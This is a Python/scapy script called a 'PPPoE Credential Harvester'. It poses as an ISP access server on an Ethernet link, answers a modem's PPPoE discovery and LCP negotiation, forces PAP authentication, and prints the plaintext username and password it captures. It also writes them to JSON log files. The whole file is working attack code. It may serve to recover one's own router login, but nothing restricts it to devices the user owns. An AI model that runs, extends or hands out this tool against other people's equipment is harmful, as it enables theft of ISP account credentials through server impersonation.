#!/usr/bin/env python3
"""
PPPoE Credential Harvester v2.0
===============================
This tool captures PPPoE packets sent by modems using VLAN 0 (Priority Tagging)
and extracts plaintext passwords via PAP (Password Authentication Protocol).

Usage:
    sudo python3 harvester.py
    sudo python3 harvester.py -i eth0
    sudo python3 harvester.py -i enp8s0 -t 120
"""

from scapy.all import *
from scapy.layers.l2 import Dot1Q, Ether
from scapy.layers.ppp import PPPoE, PPPoED, PPP_PAP_Request, PPP
import os
import sys
import struct
import signal
import argparse
import random
import json
from datetime import datetime
from pathlib import Path

# --- CONSTANTS ---
DEFAULT_IFACE = "enp8s0"
DEFAULT_TIMEOUT = 180  # seconds
SESSION_ID = 0x5555
LOG_DIR = Path(__file__).parent.parent / "logs"


class PPPoEHarvester:
    """PPPoE VLAN-Aware Credential Harvester"""

    def __init__(self, iface, timeout):
        self.iface = iface
        self.timeout = timeout
        self.my_mac = get_if_hwaddr(iface)
        self.magic_number = random.randint(0, 0xFFFFFFFF)
        self.sent_lcp = False
        self.last_ack_id = -1
        self.start_time = None

        # Create log directory
        LOG_DIR.mkdir(parents=True, exist_ok=True)

    @staticmethod
    def get_tag(tag_type, tag_value):
        """Build a PPPoE Discovery Tag"""
        if isinstance(tag_value, str):
            tag_value = tag_value.encode()
        return struct.pack("!HH", tag_type, len(tag_value)) + tag_value

    def _extract_host_cookie(self, raw_payload):
        """Extract Host-Uniq (0x0103) tag from PPPoED payload"""
        tags = b""
        idx = 0
        while idx + 4 <= len(raw_payload):
            t_type, t_len = struct.unpack("!HH", raw_payload[idx:idx + 4])
            if t_type == 0x0103:
                tags += self.get_tag(0x0103, raw_payload[idx + 4:idx + 4 + t_len])
            idx += 4 + t_len
        return tags

    def _get_vlan_info(self, pkt):
        """Extract VLAN info from packet"""
        vlan_id = pkt[Dot1Q].vlan if pkt.haslayer(Dot1Q) else 0
        prio = pkt[Dot1Q].prio if pkt.haslayer(Dot1Q) else 1
        return vlan_id, prio

    def _handle_padi(self, pkt, vlan_id, prio):
        """PADI → PADO: Respond to modem discovery probe"""
        print(f"[*] PADI Captured (MAC: {pkt.src})")
        self.sent_lcp = False
        self.last_ack_id = -1

        tags = self.get_tag(0x0101, "BRAS") + self.get_tag(0x0102, "")
        tags += self._extract_host_cookie(bytes(pkt[PPPoED].payload))

        resp = (Ether(dst=pkt.src, src=self.my_mac) /
                Dot1Q(vlan=vlan_id, prio=prio) /
                PPPoED(code=0x07, sessionid=0, len=len(tags)))
        sendp(bytes(resp) + tags, iface=self.iface, verbose=False)
        print("[+] PADO Sent (VLAN 0 Response)")

    def _handle_padr(self, pkt, vlan_id, prio):
        """PADR → PADS: Modem selected us, establish session"""
        print(f"[*] PADR Captured (MAC: {pkt.src})")

        tags = self.get_tag(0x0102, "")
        tags += self._extract_host_cookie(bytes(pkt[PPPoED].payload))

        resp = (Ether(dst=pkt.src, src=self.my_mac) /
                Dot1Q(vlan=vlan_id, prio=prio) /
                PPPoED(code=0x65, sessionid=SESSION_ID, len=len(tags)))
        sendp(bytes(resp) + tags, iface=self.iface, verbose=False)
        print(f"[+] PADS Sent (Session ID: {hex(SESSION_ID)})")

    def _handle_lcp(self, pkt, vlan_id, prio):
        """LCP Config-Request → ACK + send our PAP request"""
        raw_ppp = bytes(pkt[PPP].payload)
        if len(raw_ppp) < 4:
            return

        lcp_code, lcp_id, lcp_len = struct.unpack("!BBH", raw_ppp[:4])

        # Configure-Request (0x01)
        if lcp_code == 0x01:
            if lcp_id != self.last_ack_id:
                print(f"[*] LCP Config-Request (ID: {lcp_id})")
                # Send ACK
                lcp_payload = struct.pack("!BBH", 0x02, lcp_id, lcp_len) + raw_ppp[4:lcp_len]
                resp_hdr = (Ether(dst=pkt.src, src=self.my_mac) /
                            Dot1Q(vlan=vlan_id, prio=prio) /
                            PPPoE(sessionid=SESSION_ID, len=2 + lcp_len) /
                            PPP(proto=0xc021))
                sendp(bytes(resp_hdr) + lcp_payload, iface=self.iface, verbose=False)
                print(f"[+] LCP ACK Sent (ID: {lcp_id})")
                self.last_ack_id = lcp_id

            # Send PAP request (only once)
            if not self.sent_lcp:
                magic_bytes = struct.pack("!I", self.magic_number)
                # MRU(1492) + Auth(PAP) + MagicNumber(random)
                opts = b"\x01\x04\x05\xd4\x03\x04\xc0\x23\x05\x06" + magic_bytes
                lcp_req_payload = struct.pack("!BBH", 0x01, 0x01, 4 + len(opts)) + opts
                lcp_req_hdr = (Ether(dst=pkt.src, src=self.my_mac) /
                               Dot1Q(vlan=vlan_id, prio=prio) /
                               PPPoE(sessionid=SESSION_ID, len=2 + len(lcp_req_payload)) /
                               PPP(proto=0xc021))
                sendp(bytes(lcp_req_hdr) + lcp_req_payload, iface=self.iface, verbose=False)
                print("[+] PAP Auth Request Sent")
                self.sent_lcp = True

    def _handle_pap(self, pkt):
        """PAP Request → Password captured!"""
        print("\n" + "!" * 60 + "\n🎉 PPPoE CREDENTIALS CAPTURED!")
        try:
            p_data = bytes(pkt[PPP].payload) if pkt.haslayer(PPP) else bytes(pkt[PPP_PAP_Request])
            if p_data[0] == 0x01:  # Authenticate-Request
                u_len = p_data[4]
                user = p_data[5:5 + u_len].decode('utf-8', errors='ignore')
                p_len = p_data[5 + u_len]
                password = p_data[6 + u_len:6 + u_len + p_len].decode('utf-8', errors='ignore')

                print(f"Username: {user}\nPassword:     {password}")
                print("!" * 60 + "\n")

                # Save results to log file
                self._save_credentials(user, password)
                sys.exit(0)
        except Exception as e:
            print(f"[!] Parse error: {e}")
            if 'p_data' in locals():
                print(f"[!] Raw Data: {p_data.hex()}")

    def _save_credentials(self, username, password):
        """Save captured credentials to log file"""
        result = {
            "username": username,
            "password": password,
            "timestamp": datetime.now().isoformat(),
            "interface": self.iface,
            "method": "scapy_vlan_aware_harvester"
        }

        log_file = LOG_DIR / f"credentials_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        try:
            with open(log_file, 'w') as f:
                json.dump(result, f, indent=2, ensure_ascii=False)
            print(f"[+] Results saved: {log_file}")
        except Exception as e:
            print(f"[!] Log save error: {e}")

    def handle_pkt(self, pkt):
        """Main packet handler"""
        # Timeout check
        if self.timeout and self.start_time:
            elapsed = time.time() - self.start_time
            if elapsed > self.timeout:
                print(f"\n[!] Timeout ({self.timeout}s). Password not captured.")
                print("[*] Reboot the modem and try again.")
                sys.exit(1)

        # --- DISCOVERY (0x8863) ---
        if pkt.haslayer(PPPoED):
            vlan_id, prio = self._get_vlan_info(pkt)

            if pkt[PPPoED].code == 0x09:  # PADI
                self._handle_padi(pkt, vlan_id, prio)
            elif pkt[PPPoED].code == 0x19:  # PADR
                self._handle_padr(pkt, vlan_id, prio)

        # --- SESSION (0x8864) ---
        elif pkt.haslayer(PPPoE):
            vlan_id, prio = self._get_vlan_info(pkt)

            # LCP (0xc021)
            if pkt.haslayer(PPP) and pkt[PPP].proto == 0xc021:
                self._handle_lcp(pkt, vlan_id, prio)

            # PAP (0xc023) Request
            elif pkt.haslayer(PPP_PAP_Request) or (pkt.haslayer(PPP) and pkt[PPP].proto == 0xc023):
                self._handle_pap(pkt)

    def run(self):
        """Start the harvester"""
        print(f"[*] Harvester Started on {self.iface} (VLAN-Aware)...")
        print(f"[*] Magic Number: {hex(self.magic_number)}")
        if self.timeout:
            print(f"[*] Timeout: {self.timeout} seconds")
        print("[!] READY! Reboot the modem now.\n")

        self.start_time = time.time()

        # Clean exit on Ctrl+C
        def signal_handler(sig, frame):
            print("\n[*] Stopped by user.")
            sys.exit(0)
        signal.signal(signal.SIGINT, signal_handler)

        sniff(iface=self.iface, prn=self.handle_pkt, store=0)


def main():
    parser = argparse.ArgumentParser(
        description="PPPoE Credential Harvester - VLAN 0 Aware",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 harvester.py                    # Default interface (enp8s0)
  sudo python3 harvester.py -i eth0            # Different interface
  sudo python3 harvester.py -i enp8s0 -t 120   # 2 minute timeout
  sudo python3 harvester.py -t 0               # No timeout (wait indefinitely)
        """
    )
    parser.add_argument(
        "-i", "--interface",
        default=DEFAULT_IFACE,
        help=f"Ethernet interface (default: {DEFAULT_IFACE})"
    )
    parser.add_argument(
        "-t", "--timeout",
        type=int,
        default=DEFAULT_TIMEOUT,
        help=f"Timeout in seconds (default: {DEFAULT_TIMEOUT}, 0=unlimited)"
    )
    args = parser.parse_args()

    timeout = args.timeout if args.timeout > 0 else None

    harvester = PPPoEHarvester(iface=args.interface, timeout=timeout)
    harvester.run()


if __name__ == "__main__":
    main()
